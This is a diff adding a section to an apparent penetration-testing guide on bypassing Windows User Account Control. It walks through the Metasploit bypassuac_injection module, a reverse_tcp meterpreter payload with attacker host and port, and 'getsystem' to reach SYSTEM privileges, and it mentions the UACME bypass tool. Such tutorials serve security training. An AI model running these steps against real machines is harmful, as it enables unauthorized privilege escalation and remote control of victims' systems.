@@ -2,6 +2,32 @@ User Account Control (UAC) is a security feature in Microsoft Windows designed t
 
 ![](../../Images/uac_example.png)
 
+## BypassUAC_injection (Metasploit)
+1. **Set up the module**: To use the `bypassuac_injection` module, start by selecting it within Metasploit:
+```bash
+msf6 > use exploit/windows/local/bypassuac_injection
+```
+
+2. **Set required options**: Once the module is selected, set the required options:
+
+- `SESSION`: The session ID of the compromised machine.
+- `PAYLOAD`: The payload you want to deliver (e.g., `windows/x64/meterpreter/reverse_tcp`).
+- `TARGET`: The target architecture used by the victim machine.
+- `LHOST`: The attacker's local host IP address.
+- `LPORT`: The attacker's listening port for the reverse connection.
+
+3. **Exploit the system**:
+
+```bash
+run
+```
+
+4. **Escalate privileges**: After running the exploit a meterpreter session will spawn with the privileges of the original session. To gain the Authority system privileges is necessary to execute the following command on the meterpreter session:
+
+```bash
+getsystem
+```
+
 ## UACMe
 
 [UACME](https://github.com/hfiref0x/UACME) is a tool designed to bypass User Account Control (UAC) prompts on Windows operating systems. It leverages vulnerabilities in the UAC mechanism to elevate privileges without requiring user interaction. UACME is primarily used for **post-exploitation** activities to escalate privileges during penetration testing or ethical hacking exercises.
